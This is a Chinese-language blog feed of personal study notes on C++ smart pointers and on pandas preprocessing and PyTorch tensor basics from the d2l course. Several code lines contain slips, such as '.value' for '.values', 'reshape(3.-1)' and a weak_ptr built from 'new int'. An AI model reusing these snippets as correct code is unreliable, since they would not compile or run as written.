就是使用v1.get()和直接使用v1是一样的效果！</p></li><li><p>而release()是返回一个裸指针并将原始指针变为NULL</p></li></ul><p>个人还觉得，尽量避免智能指针和普通指针的混合，那样容易非常的乱，导致内存泄露，导致崩溃</p><ol start="2"><li>unique_ptr 没有重载加减运算符 但是可以通过<strong>普通指针</strong>来进行操作</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">unique_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">v3</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>)</span></span>;<br><span class="hljs-type">int</span>*v4 = v3.<span class="hljs-built_in">get</span>();<br>(*v4)++; <span class="hljs-comment">//注意只有对所指向的对象进行操作时才会反映到unique_ptr所指向的对象上</span><br></code></pre></td></tr></table></figure><p>同时我们使用get()函数获取原始指针后，最后不需要delete，因为和智能指针指向同一片堆区内存，智能指针脱离生命周期后会自动析构，所以普通指针也会被销毁掉，因此不需要执行销毁操作。</p><h3 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h3><ol><li>使用unique_ptr实现虚拟多态</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">unique_ptr&lt;MyClass1&gt; v1 = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">//父类对象指针</span><br><span class="hljs-function">unique_ptr&lt;MyClass2&gt; <span class="hljs-title">v2</span><span class="hljs-params">(<span class="hljs-keyword">new</span> MyClass2)</span></span>; <span class="hljs-comment">//子类对象指针，指向一片堆区内存</span><br>v1.<span class="hljs-built_in">reset</span>(v2.<span class="hljs-built_in">release</span>());    <span class="hljs-comment">//将子类的对象指针返回给父类，子类为NULL</span><br>v1-&gt;<span class="hljs-built_in">Sub_1</span>(); <span class="hljs-comment">//父类调用子类成员函数</span><br></code></pre></td></tr></table></figure><ol start="2"><li>自定义删除器</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">1.</span>函数指针方式<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Sub_6</span><span class="hljs-params">(<span class="hljs-type">int</span>* ParameterData)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">delete</span> ParameterData;<br>&#125;<br><span class="hljs-keyword">auto</span> __xx = [](<span class="hljs-type">int</span>* ParameterData)&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;Sub_6\r\n&quot;</span>));<br><span class="hljs-keyword">delete</span> ParameterData;&#125;;<span class="hljs-comment">//匿名函数 只占资源对象地址 lambda表达式</span><br>   <span class="hljs-number">2.</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Sub_5</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>unique_ptr&lt;<span class="hljs-type">int</span>,<span class="hljs-built_in">void</span>(*)(<span class="hljs-type">int</span>*)&gt;<span class="hljs-built_in">v1</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>,Sub_6); <span class="hljs-comment">//函数指针 资源对象地址+删除器函数指针地址</span><br>unique_ptr&lt;<span class="hljs-type">int</span>,<span class="hljs-keyword">decltype</span>(Sub_6)*&gt;<span class="hljs-built_in">v1</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>,Sub_6);<br><span class="hljs-comment">//以上两种表达方式相同</span><br>unique_ptr&lt;<span class="hljs-type">int</span>,<span class="hljs-keyword">decltype</span>(__xx)&gt;<span class="hljs-built_in">v1</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>,__xx);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-shared-ptr"><a href="#2-shared-ptr" class="headerlink" title="(2)shared_ptr"></a>(2)shared_ptr</h2><p><strong>结构：</strong>有两个成员，第一成员是原始指针，为从堆区申请的动态内存空间的地址</p><p>第二成员是用于引用计数的内存对象，是由_Ref_count_base类继承而来的 _Ref_count类创建的对象</p><p> 该对象有四个成员：</p><p>第一个成员为<strong>虚表地址</strong>：因为是派生类的对象，调用了父类的虚函数</p><p>第二个成员为**__Users**：</p><p>第三个成员为**__Weaks**</p><p>第四个成员为<strong>原始指针</strong></p><p>其构造函数和<strong>unique_ptr</strong>不同点在于，其有一个计数器</p><p>而且，<strong>shared_ptr</strong>可以进行拷贝赋值</p><p>每进行一次拷贝赋值**__Users<strong>就需要</strong>++**操作</p><p>并且在拷贝构造后，<strong>v2</strong>和<strong>v1</strong>会指向同一片内存</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">shared_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">v1</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>(<span class="hljs-number">0</span>))</span></span>;  <span class="hljs-comment">//构造函数</span><br><span class="hljs-function">shared_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">v2</span><span class="hljs-params">(v1)</span></span>;  <span class="hljs-comment">//拷贝构造函数</span><br>shared_ptr&lt;<span class="hljs-type">int</span>&gt; v3 = v1; <span class="hljs-comment">//拷贝构造函数</span><br>shared_ptr&lt;<span class="hljs-type">int</span>&gt; v4;<br>v4 = v1;<span class="hljs-comment">//等号运算符重载</span><br></code></pre></td></tr></table></figure><p>不能使用<strong>原始指针</strong>对shared_ptr初始化<br>错误例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">shared_ptr&lt;<span class="hljs-type">int</span>&gt; v5 = <span class="hljs-built_in">make_shared</span>&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">10</span>);<br><span class="hljs-function">shared_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">v6</span><span class="hljs-params">(v5.get())</span></span>;<br><span class="hljs-function">shared_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">v7</span><span class="hljs-params">(v5.get())</span></span>;<br></code></pre></td></tr></table></figure><p>自定义删除器：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">shared_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">v1</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">10</span>],default_delete&lt;<span class="hljs-type">int</span>[]&gt;())</span></span>; <span class="hljs-comment">//自定义指针数组删除器</span><br>v1.<span class="hljs-built_in">reset</span>();  <span class="hljs-comment">//会使得v2的Users--，因为v1为空了，相当于v2共享资源的对象少了一个 可以通过该手段进行资源回收</span><br></code></pre></td></tr></table></figure><p><strong>使用shared_ptr传参时，也会影响Users++</strong> 相当于又创建了一个对对象的引用指针<br>新标准支持使用中括号对智能指针数组进行访问<br>返回值类型为<strong>shared_ptr</strong>时，也会造成**_Users++** ，前提是，函数内部中的<strong>shared_ptr</strong>是静态的（生命周期全局，引用数不–），如果非静态，当离开当前作用域后就会自动调用析构函数（引用数–）</p><h2 id="2-weak-ptr"><a href="#2-weak-ptr" class="headerlink" title="(2)weak_ptr"></a>(2)weak_ptr</h2><p>辅助shared_ptr使用<br>解决循环引用的问题<br>//shared_ptr赋予一个新值<br>//shared_ptr为局部变量离开了作用域，或是shared_ptr被销毁</p><p>解决方案：</p><p>将其中一个类成员shared_ptr指针更改为weak_ptr<br>weak_ptr与shared_ptr<strong>结构一致</strong><br>不能单独被new出来，只能<strong>辅助shared_ptr</strong><br>与shared_ptr指向同一片内存时，其内部的_Users不会++</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">shared_ptr&lt;MyClass1&gt; <span class="hljs-title">v1</span><span class="hljs-params">(<span class="hljs-keyword">new</span> MyClass1())</span></span>;<br><span class="hljs-function">shared_ptr&lt;MyClass2&gt; <span class="hljs-title">v2</span><span class="hljs-params">(<span class="hljs-keyword">new</span> MyClass2())</span></span>;<br>v1-&gt;m_1 = v2;<br>v2-&gt;m_1 = v1;<br>-------------<br><span class="hljs-comment">//MyClass1</span><br>    weak_ptr&lt;MyClass1&gt;<span class="hljs-built_in">m_1</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>);<br><span class="hljs-comment">//MyClass2</span><br>shared_ptr&lt;MyClass2&gt;<span class="hljs-built_in">m_1</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>);<br></code></pre></td></tr></table></figure><p>1.当MyClass1和MyClass2中都有一个shared_ptr成员m_1时，整个程序结束后，v1和v2的引用计数都是1，没有为0，产生内存泄漏。</p><p>2.当有一个为weak_ptr时，假设是Myclass1中m_1为weak_ptr，这时 v1 -&gt; m_1 = v2 后，v2只有一次引用计数，v2析构后，其为0。当v1析构后，此时MyClass2中的m_1消失，v1引用计数变为1，然后，因为v1析构，其引用计数再–，变为0  </p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
      <category>面试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>d2l - 数据预处理 Day_2</title>
    <link href="/project/2023/03/15/d2l-%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86/"/>
    <url>/project/2023/03/15/d2l-%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>跟李沐学AI的第二天</p><span id="more"></span><h2 id="1-读取数据集"><a href="#1-读取数据集" class="headerlink" title="1.读取数据集"></a>1.读取数据集</h2><p>举⼀个例⼦，我们⾸先创建⼀个<strong>⼈⼯数据集</strong>，并存储在<strong>CSV</strong>（逗号分隔值）⽂件 <strong>../data/house_tiny.csv</strong>中。<br>以其他格式存储的数据也可以通过类似的⽅式进⾏处理。下⾯我们将数据集按⾏写⼊<strong>CSV</strong>⽂件中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>os.makedirs(os.path.join(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;data&#x27;</span>), exist_ok=<span class="hljs-literal">True</span>) <span class="hljs-comment">#传入一个path路径，生成一个递归的文件夹；</span><br>data_file = os.path.join(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-string">&#x27;house_tiny.csv&#x27;</span>)<span class="hljs-comment">#传入三个path路径，将该路径拼接起来，形成一个新的完整路径；</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(data_file, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>f.write(<span class="hljs-string">&#x27;NumRooms,Alley,Price\n&#x27;</span>) <span class="hljs-comment"># 列名</span><br>f.write(<span class="hljs-string">&#x27;NA,Pave,127500\n&#x27;</span>) <span class="hljs-comment"># 每⾏表⽰⼀个数据样本</span><br>f.write(<span class="hljs-string">&#x27;2,NA,106000\n&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;4,NA,178100\n&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;NA,NA,140000\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p>要从创建的<strong>CSV</strong>⽂件中加载原始数据集，我们导⼊pandas包并调⽤<strong>read_csv</strong>函数。该数据集有四⾏三列。其中每⾏描述了房间数量<strong>（“NumRooms”）</strong>、巷⼦类型<strong>（“Alley”）</strong>和房屋价格<strong>（“Price”）</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 如果没有安装pandas，只需取消对以下⾏的注释来安装pandas</span><br><span class="hljs-comment"># !pip install pandas</span><br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br>data = pd.read_csv(data_file)<br><span class="hljs-built_in">print</span>(data)<br></code></pre></td></tr></table></figure><h2 id="2-处理缺失值"><a href="#2-处理缺失值" class="headerlink" title="2.处理缺失值"></a>2.处理缺失值</h2><p>注意，“<strong>NaN</strong>”项代表缺失值。为了处理缺失的数据，典型的⽅法包括插值法和删除法，其中插值法⽤⼀个替代值弥补缺失值，⽽删除法则直接忽略缺失值。在这⾥，我们将考虑<strong>插值法</strong>。<br>通过位置索引<strong>iloc</strong>，我们将<strong>data</strong>分成<strong>inputs</strong>和<strong>outputs</strong>，其中前者为<strong>data</strong>的前两列，⽽后者为<strong>data</strong>的最后⼀列。<br>对于inputs中缺少的数值，我们⽤同⼀列的<strong>均值</strong>替换“<strong>NaN</strong>”项。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">inputs, outputs = data.iloc[:, <span class="hljs-number">0</span>:<span class="hljs-number">2</span>], data.iloc[:, <span class="hljs-number">2</span>]<br>inputs = inputs.fillna(inputs.mean())<br></code></pre></td></tr></table></figure><p>iloc使用<strong>顺序数字</strong>来索引数据，而不能使用字符型的标签来索引数据；注意：这里的顺序数字是指从0开始计数！</p><p>loc使用<strong>实际设置的索引</strong>来索引数据。但行列名为数字时，loc也可以索引数字，但这里的数字不一定从0开始编号，是对应具体行列名的数字！</p><p>对于inputs中的类别值或离散值，我们将“<strong>NaN</strong>”视为⼀个类别。由于“<strong>巷⼦类型</strong>”（“<strong>Alley</strong>”）列只接受两种类型的类别值“<strong>Pave</strong>”和“<strong>NaN</strong>”，<strong>pandas</strong>可以<strong>⾃动</strong>将此列转换为列“<strong>Alley_Pave</strong>”和“<strong>Alley_nan</strong>”。巷⼦类型为“<strong>Pave</strong>”的⾏会将“<strong>Alley_Pave</strong>”的值设置为1，“<strong>Alley_nan</strong>”的值设置为0。缺少巷⼦类型的⾏会将“<strong>Alley_Pave</strong>”和“<strong>Alley_nan</strong>”分别设置为0和1。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">inputs = pd.get_dummies(inputs,dummy_na=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(inputs)<br></code></pre></td></tr></table></figure><h2 id="3-转换为张量格式"><a href="#3-转换为张量格式" class="headerlink" title="3.转换为张量格式"></a>3.转换为张量格式</h2><p>现在inputs和outputs中的所有条⽬都是数值类型，它们可以转换为张量格式。当数据采⽤张量格式后，可以通过在2.1节中引⼊的那些张量函数来进⼀步操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br>X,y = torch.tensor(inputs.value),torch.tensor(outputs.values)<br></code></pre></td></tr></table></figure><p><strong>⼩结</strong></p><ul><li><p>pandas软件包是Python中常⽤的数据分析⼯具中，pandas可以与张量兼容。</p></li><li><p>⽤pandas处理缺失的数据时，我们可根据情况选择⽤插值法和删除法。</p></li></ul><p><strong>练习</strong></p><p>创建包含更多⾏和列的原始数据集。</p><p>​    1.删除缺失值最多的列。</p><p>​    2.将预处理后的数据集转换为张量格式。</p>]]></content>
    
    
    <categories>
      
      <category>深度学习</category>
      
      <category>跟李沐学AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深度学习</tag>
      
      <tag>Pytorch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>d2l - 数据操作 Day_1</title>
    <link href="/project/2023/03/14/d2l-%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/"/>
    <url>/project/2023/03/14/d2l-%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>跟李沐学AI的第一天</p><span id="more"></span><h2 id="1-入门"><a href="#1-入门" class="headerlink" title="1.入门"></a>1.入门</h2><p>首先，我们介绍<em><strong>n</strong></em>维数组，也称为张量（<strong>tensor</strong>）。⽆论使⽤哪个深度学习框架，它的张量类（在<em><strong>MXNet</strong></em>中为<strong>ndarray</strong>，在<strong>PyTorch</strong>和<strong>TensorFlow</strong>中为<strong>Tensor</strong>）都与<strong>Numpy</strong>的<strong>ndarray</strong>类似。但深度学习框架⼜⽐<strong>Numpy</strong>的<strong>ndarray</strong>多⼀些重要功能：⾸先，<strong>GPU</strong>很好地⽀持加速计算，⽽<strong>NumPy</strong>仅⽀持CPU计算；其次，张量类⽀持<strong>⾃动微分</strong>。这些功能使得张量类更适合深度学习。如果没有特殊说明，本书中所说的张量均指的是张量类的实例。</p><p>⾸先，我们导⼊<strong>torch</strong>。请注意，虽然它被称为<strong>PyTorch</strong>，但是代码中使⽤<strong>torch</strong>⽽不是<strong>pytorch</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br></code></pre></td></tr></table></figure><p>张量表⽰⼀个由数值组成的数组，这个数组可能有多个维度。具有⼀个轴的张量对应数学上的向量（<strong>vector</strong>）；</p><p>具有两个轴的张量对应数学上的矩阵（<strong>matrix</strong>）；具有两个轴以上的张量没有特殊的数学名称。</p><p>⾸先，我们可以使⽤ <strong>arange</strong> 创建⼀个⾏向量 x。这个⾏向量包含以0开始的前12个整数，它们默认创建为整数。也可指定创建类型为浮点数。张量中的每个值都称为张量的 元素（<strong>element</strong>）。例如，张量 x 中有 12 个元素。除⾮额外指定，新的张量将存储在内存中，并采⽤基于<strong>CPU</strong>的计算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">x = torch.arange(<span class="hljs-number">12</span>) <span class="hljs-comment"># 创建一个有12个元素的行向量</span><br></code></pre></td></tr></table></figure><p>我们可以通过张量的<strong>shape</strong>属性来访问张量（沿每个轴的长度）的形状。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">x.shape  <span class="hljs-comment"># 返回输入tensor张量的维度大小</span><br>x.size() <span class="hljs-comment"># 跟torch.shape效果相同，也是返回输入tensor张量的维度大小。</span><br></code></pre></td></tr></table></figure><p>如果只想知道张量中元素的总数，即形状的所有元素乘积，可以检查它的大小（size)。因为这里在处理的是一个向量，所以它的<strong>shape</strong>与它的<strong>size</strong>相同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">x.numel() <span class="hljs-comment"># 返回输入张量中元素的总数</span><br></code></pre></td></tr></table></figure><p>要想改变⼀个张量的形状⽽不改变元素数量和元素值，可以调⽤reshape函数。例如，可以把张量x从形状为<strong>（12,）</strong>的⾏向量转换为形状为<strong>（3,4）</strong>的矩阵。这个新的张量包含与转换前相同的值，但是它被看成⼀个<strong>3</strong>⾏<strong>4</strong>列的矩阵。要重点说明⼀下，虽然张量的形状发⽣了改变，但其元素值并没有变。注意，通过改变张量的形状，张量的⼤⼩不会改变。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">X =x.reshape(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>) <span class="hljs-comment"># 返回将输入的形状转变为shape指定的形状大小，元素总数不变。</span><br></code></pre></td></tr></table></figure><p>我们不需要通过⼿动指定每个维度来改变形状。也就是说，如果我们的⽬标形状是（⾼度,宽度），那么在知道宽度后，⾼度会被⾃动计算得出，不必我们⾃⼰做除法。在上⾯的例⼦中，为了获得⼀个3⾏的矩阵，我们⼿动指定了它有<strong>3</strong>⾏和<strong>4</strong>列。幸运的是，我们可以通过**-1<strong>来调⽤此⾃动计算出维度的功能。即我们可以⽤</strong>x.reshape(-1,4)<strong>或</strong>x.reshape(3,-1)<strong>来取代</strong>x.reshape(3,4)**。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">x.reshape(-<span class="hljs-number">1</span>,<span class="hljs-number">4</span>)<br>x.reshape(<span class="hljs-number">3.</span>-<span class="hljs-number">1</span>)<br>x.reshape(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)<br><span class="hljs-comment">#上面三个表达式效果相同</span><br></code></pre></td></tr></table></figure><p>有时，我们希望使⽤全<strong>0</strong>、全<strong>1</strong>、其他常量，或者从特定分布中随机采样的数字来初始化矩阵。我们可以创建⼀个形状为<strong>（2,3,4）</strong>的张量，其中所有元素都设置为<strong>0</strong>。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">torch.zeros((<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)) <br></code></pre></td></tr></table></figure><p>同样，我们可以创建⼀个形状为(2,3,4)的张量，其中所有元素都设置为1。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">torch.ones((<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>))<br></code></pre></td></tr></table></figure><p>有时我们想通过从某个特定的概率分布中随机采样来得到张量中每个元素的值。例如，当我们构造数组来作为神经⽹络中的参数时，我们通常会随机初始化参数的值。以下代码创建⼀个形状为<strong>（3,4）</strong>的张量。其中的每个元素都从均值为<strong>0</strong>、标准差为<strong>1</strong>的标准⾼斯分布（正态分布）中随机采样。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">torch.randn(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure><p>我们还可以通过提供包含数值的Python列表（或嵌套列表），来为所需张量中的每个元素赋予确定值。在这⾥，最外层的列表对应于轴<strong>0</strong>，内层的列表对应于轴<strong>1</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">torch.tensor([[<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>]])<br></code></pre></td></tr></table></figure><h2 id="2-运算符"><a href="#2-运算符" class="headerlink" title="2.运算符"></a>2.运算符</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">x = torch.tensor([<span class="hljs-number">1.0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>])<br>y = torch.tensor([<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>])<br>x + y, x - y, x * y, x / y, x ** y <span class="hljs-comment"># **运算符是求幂运算</span><br>torch.exp(x) <span class="hljs-comment">#求幂</span><br></code></pre></td></tr></table></figure><p>除了按元素计算外，我们还可以执⾏线性代数运算，包括向量点积和矩阵乘法。我们将在 <strong>2.3节</strong>中解释线性代数的重点内容。我们也可以把多个张量连结（<strong>concatenate</strong>）在⼀起，把它们端对端地叠起来形成⼀个更⼤的张量。我们只需要提供张量列表，并给出沿哪个轴连结。下⾯的例⼦分别演⽰了当我们沿⾏（轴-<strong>0</strong>，<strong>形状的第⼀个元素</strong>）和按 列（轴-<strong>1</strong>，<strong>形状的第⼆个元素</strong>）连结两个矩阵时，会发⽣什么情况。我们可以看到，第⼀个输出张量的轴-<strong>0</strong>⻓度（<strong>6</strong>）是两个输⼊张量轴-<strong>0</strong>⻓度的总和（<strong>3 + 3</strong>）；第⼆个输出张量的轴-<strong>1</strong>⻓度（<strong>8</strong>）是两个输⼊张量轴-<strong>1</strong>⻓度的总和（<strong>4 + 4</strong>）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">X = torch.arange(<span class="hljs-number">12</span>, dtype=torch.float32).reshape((<span class="hljs-number">3</span>,<span class="hljs-number">4</span>))<br>Y = torch.tensor([[<span class="hljs-number">2.0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>]])<br>torch.cat((X, Y), dim=<span class="hljs-number">0</span>), torch.cat((X, Y), dim=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>有时，我们想通过逻辑运算符构建⼆元张量。以<strong>X == Y</strong>为例：对于每个位置，如果<strong>X</strong>和<strong>Y</strong>在该位置相等，则新张量中相应项的值为<strong>1</strong>。这意味着逻辑语句<strong>X == Y</strong>在该位置处为真，否则该位置为<strong>0</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">X == Y<br>OUT:<br>    tensor([[<span class="hljs-literal">False</span>, <span class="hljs-literal">True</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">True</span>],<br>[<span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>],<br>[<span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>]])<br></code></pre></td></tr></table></figure><p>对张量中的所有元素进⾏求和，会产⽣⼀个单元素张量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">X.<span class="hljs-built_in">sum</span>()<br>OUT:<br>tensor(<span class="hljs-number">66.</span>)<br></code></pre></td></tr></table></figure><h2 id="3-广播机制"><a href="#3-广播机制" class="headerlink" title="3.广播机制"></a>3.广播机制</h2><p>在上⾯的部分中，我们看到了如何在相同形状的两个张量上执⾏按元素操作。在某些情况下，即使形状不同，</p><p>我们仍然可以通过调⽤ <strong>⼴播机制（broadcasting mechanism）</strong>来执⾏按元素操作。这种机制的⼯作⽅式如</p><p>下：</p><ul><li><p> 通过适当复制元素来扩展⼀个或两个数组，以便在转换之后，两个张量具有相同的形状；</p></li><li><p>对⽣成的数组执⾏按元素操作。</p></li></ul><p>在⼤多数情况下，我们将沿着数组中⻓度为1的轴进⾏⼴播，如下例⼦：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">a = torch.arange(<span class="hljs-number">3</span>).reshape((<span class="hljs-number">3</span>, <span class="hljs-number">1</span>))<br>b = torch.arange(<span class="hljs-number">2</span>).reshape((<span class="hljs-number">1</span>, <span class="hljs-number">2</span>))<br>a, b<br>OUT:<br>    (tensor([[<span class="hljs-number">0</span>],<br>[<span class="hljs-number">1</span>],<br>[<span class="hljs-number">2</span>]]),<br>tensor([[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]]))<br></code></pre></td></tr></table></figure><p>由于a和b分别是3 <em>×</em> 1和1 <em>×</em> 2矩阵，如果让它们相加，它们的形状不匹配。我们将两个矩阵⼴播为⼀个更⼤的3 <em>×</em> 2矩阵，如下所⽰：矩阵a将复制列，矩阵b将复制⾏，然后再按元素相加。 <strong>注意：自己复制自己</strong></p><h2 id="4-索引和切片"><a href="#4-索引和切片" class="headerlink" 